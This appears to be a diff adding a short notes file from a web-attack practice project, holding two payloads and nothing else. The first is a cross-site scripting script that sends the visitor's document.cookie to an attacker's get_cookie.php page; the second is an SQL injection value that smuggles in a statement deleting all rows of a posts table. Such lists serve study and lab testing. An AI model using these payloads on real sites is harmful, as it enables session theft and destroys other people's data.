@@ -1,0 +1,11 @@
+xss:
+================================
+
+<script>document.location = '/web_attack/attacker/get_cookie.php?cookie=' + document.cookie</script>
+
+
+
+
+sql injection:
+=================================
+query = 4;delete from posts where id=id;--
